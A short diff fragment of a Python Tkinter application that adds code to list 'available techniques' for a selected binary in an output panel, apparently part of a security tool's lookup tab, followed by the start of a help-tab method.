+            self.lolol_output.insert(tk.END, "Available techniques:\n\n")
+            for func, cmd in binary_data.items():
+                self.lolol_output.insert(tk.END, f"▶ {func}:\n{cmd}\n\n")
 
     def create_help_tab(self):
         """Create the Help tab with comprehensive guide."""
